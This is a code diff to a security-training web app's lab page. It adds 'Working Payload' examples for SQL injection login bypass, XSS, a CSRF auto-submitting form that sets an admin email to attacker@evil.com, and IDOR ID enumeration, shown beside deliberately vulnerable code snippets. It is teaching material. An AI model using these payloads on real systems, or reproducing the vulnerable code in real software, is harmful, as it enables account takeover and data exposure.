@@ -41,6 +41,7 @@ const LabPage = () => {
       scenario:
         "A web application uses string concatenation to build SQL queries without sanitization. Try to bypass the login form.",
       vulnerableCode: `username = request.form['username']\npassword = request.form['password']\nquery = "SELECT * FROM users WHERE username='" + username + "' AND password='" + password + "'"\nresult = db.execute(query)`,
+      payload: `Username: admin' --\nPassword: (anything)`,
       hint1:
         "Try using SQL comment operators like -- or /* to bypass the password check.",
       hint2: "The payload might look like: admin' --",
@@ -58,6 +59,7 @@ const LabPage = () => {
       scenario:
         "A comment system displays comments from database without escaping HTML/JavaScript.",
       vulnerableCode: `comment = request.form['comment']\ndb.insert('comments', {'text': comment})\n\n<!-- In template: -->\n{% for comment in comments %}\n  <p>{{ comment.text }}</p>\n{% endfor %}`,
+      payload: `<img src=x onerror="alert('XSS Vulnerability Found!')">`,
       hint1:
         "You need to inject JavaScript code that will execute when the page loads.",
       hint2: 'Try using <script> tags or event handlers like <img onerror="">',
@@ -75,6 +77,7 @@ const LabPage = () => {
       scenario:
         "An admin is logged in. Create a page that makes them perform unintended actions.",
       vulnerableCode: `@app.route('/api/admin/settings', methods=['POST'])\n@require_auth\ndef change_settings():\n    setting = request.form['setting']\n    value = request.form['value']\n    # No CSRF token verification!\n    save_setting(setting, value)\n    return {'success': True}`,
+      payload: `<form action="http://localhost:5000/api/admin/settings" method="POST">\n  <input type="hidden" name="setting" value="admin_email">\n  <input type="hidden" name="value" value="attacker@evil.com">\n</form>\n<script>document.forms[0].submit();</script>`,
       hint1:
         "CSRF works because browsers auto-send cookies with requests to the same domain.",
       hint2: "Create a form that auto-submits to the vulnerable endpoint.",
@@ -92,6 +95,7 @@ const LabPage = () => {
       scenario:
         "API endpoint: GET /api/user/profile/123 returns user profile. Try changing the ID.",
       vulnerableCode: `@app.route('/api/user/profile/<int:user_id>', methods=['GET'])\ndef get_profile(user_id):\n    user = db.query('SELECT * FROM users WHERE id = ?', user_id)\n    # No check if current user is allowed to see this profile!\n    return user.to_json()`,
+      payload: `Try accessing different user IDs:\n/api/user/profile/1\n/api/user/profile/2\n/api/user/profile/3\n(Admin is usually ID 1)`,
       hint1: "Try incrementing or decrementing the user ID in the URL.",
       hint2:
         "If you're user 5, try accessing /api/user/profile/1, /2, /3, /4, /6, etc.",
@@ -235,18 +239,18 @@ const LabPage = () => {
         setLabUrl(response.data.practical_lab);
         // Open lab in new window after 2 seconds
         setTimeout(() => {
-          window.open(response.data.practical_lab, '_blank');
+          window.open(response.data.practical_lab, "_blank");
         }, 500);
       } else {
         setResult({
           success: false,
-          message: response.data.instructions || "Lab not available"
+          message: response.data.instructions || "Lab not available",
         });
       }
     } catch (error) {
       setResult({
         success: false,
-        message: error.response?.data?.error || "Failed to launch lab"
+        message: error.response?.data?.error || "Failed to launch lab",
       });
     } finally {
       setLaunching(false);
@@ -339,13 +343,32 @@ const LabPage = () => {
                     <Eye size={20} />
                   )}
                   <span>
-                    {showVulnerableCode ? "Hide" : "Show"} Vulnerable Code
+                    {showVulnerableCode ? "Hide" : "Show"} Vulnerable Code &
+                    Payload
                   </span>
                 </button>
 
                 {showVulnerableCode && (
-                  <div className="bg-slate-950/80 border border-red-500/30 rounded-lg p-6 font-mono text-sm text-red-200 overflow-x-auto whitespace-pre-wrap">
-                    {challenge?.vulnerableCode}
+                  <div className="space-y-4">
+                    <div>
+                      <h4 className="text-sm font-semibold text-red-300 mb-2">
+                        Vulnerable Code:
+                      </h4>
+                      <div className="bg-slate-950/80 border border-red-500/30 rounded-lg p-6 font-mono text-sm text-red-200 overflow-x-auto whitespace-pre-wrap">
+                        {challenge?.vulnerableCode}
+                      </div>
+                    </div>
+
+                    {challenge?.payload && (
+                      <div>
+                        <h4 className="text-sm font-semibold text-yellow-300 mb-2">
+                          Working Payload:
+                        </h4>
+                        <div className="bg-slate-950/80 border border-yellow-500/30 rounded-lg p-6 font-mono text-sm text-yellow-200 overflow-x-auto whitespace-pre-wrap">
+                          {challenge?.payload}
+                        </div>
+                      </div>
+                    )}
                   </div>
                 )}
               </div>
@@ -363,11 +386,13 @@ const LabPage = () => {
               {labUrl ? (
                 <div className="space-y-4">
                   <div className="bg-green-500/20 border border-green-500/50 rounded-lg p-4">
-                    <p className="text-green-300 text-sm font-semibold">✓ Lab Running</p>
+                    <p className="text-green-300 text-sm font-semibold">
+                      ✓ Lab Running
+                    </p>
                     <p className="text-green-200 text-xs mt-1">{labUrl}</p>
                   </div>
                   <button
-                    onClick={() => window.open(labUrl, '_blank')}
+                    onClick={() => window.open(labUrl, "_blank")}
                     className="w-full px-4 py-3 bg-gradient-to-r from-orange-500 to-red-500 hover:from-orange-600 hover:to-red-600 text-white font-bold rounded-lg transition flex items-center justify-center space-x-2"
                   >
                     <ExternalLink size={20} />
